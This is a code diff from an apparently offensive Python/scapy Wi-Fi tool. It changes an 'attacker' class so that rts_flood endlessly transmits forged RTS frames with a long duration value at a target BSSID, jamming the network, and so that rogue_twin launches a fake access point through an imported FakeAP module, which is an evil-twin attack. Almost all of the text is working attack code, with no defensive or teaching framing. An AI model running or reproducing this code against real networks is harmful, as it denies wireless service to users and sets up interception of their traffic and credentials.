@@ -18,6 +18,8 @@ from scapy import *
 from scapy.layers.dot11 import RadioTap, Dot11, conf
 from scapy.sendrecv import sendp
 
+from Sniffer_dir import FakeAP
+
 class attacker:
     def __init__(self, attack_int):
         self.attack_int = attack_int
@@ -25,20 +27,22 @@ class attacker:
     def __del__(self): # Destroy here all complex fields!!!
         self.screen = ""
 
-    # def __init__(self):
-    #     print("starting attacker")
-
     # def cts_flood(self):
     #     while True:
     #         print("ABCD")
     #         time.sleep(1)
 
-    def rts_flood(self, BSSID, Freq, Channel, attacking_addr='05:12:54:15:54:11'):
+    def rts_flood(self, args: dict):
         self.screen = Drawer.drawer()
 
+        if "attacking_addr" in args.keys():
+            attacking_addr = args["attacking_addr"]
+        else:
+            attacking_addr = '05:12:54:15:54:11'
+
         self.attack_int = self.__start_monitor_mode(self.attack_int)
-        if Freq == "0":  # 2.4 GHz
-            self.__change_channel(self.attack_int, Channel) #TODO Сделать различие от диапазона частот
+        if args["Freq"] == '2.4':  # 2.4 GHz
+            self.__change_channel(self.attack_int, int(args["Channel"])) #TODO Сделать различие от диапазона частот
 
         # conf = scapy.config.Conf()
         # conf.use_pcap = True
@@ -46,7 +50,7 @@ class attacker:
         bytes = struct.pack("<H", 32768)  # 32767 microseconds
         timeval = struct.unpack(">H", bytes)[0]
         # print(timeval)
-        frame = RadioTap() / Dot11(type=1, subtype=11, addr1 = BSSID, addr2=attacking_addr, ID=timeval)
+        frame = RadioTap() / Dot11(type=1, subtype=11, addr1=args["BSSID"], addr2=attacking_addr, ID=timeval)
         # RadioTap() / Dot11(type=1, subtype=11, addr1 = target_addr, addr2 = my_addr, ID=timeval) #RTS
         # RadioTap() / Dot11(type=1, subtype=12, addr1 = target_addr, ID=timeval) #CTS
         quantity = 1000
@@ -55,16 +59,21 @@ class attacker:
 
         while True:
             sendp(frame, iface=self.attack_int, count=quantity, verbose=0)  # verbose=0, monitor=True
-        #
-        # while True:
-        #     print("attacking...")
-        #     time.sleep(3)
+
 
     def null_probe_response(self):
         print("null_probe_response")
 
-    def rogue_twin(self):
-        print("rogue_twin")
+    def rogue_twin(self, args: dict):
+        self.screen = Drawer.drawer()
+
+        print(args.keys())
+        print(args.values())
+        if args["Freq"] == '2.4':  # 2.4 GHz
+            self.__change_channel(self.attack_int, int(args["Channel"])) #TODO Сделать различие от диапазона частот
+
+            ap = FakeAP.AP(wirelessiface=self.attack_int, channel=int(args["Channel"]))
+            ap.launch()
 
 
     def __GetInterfaces(self):
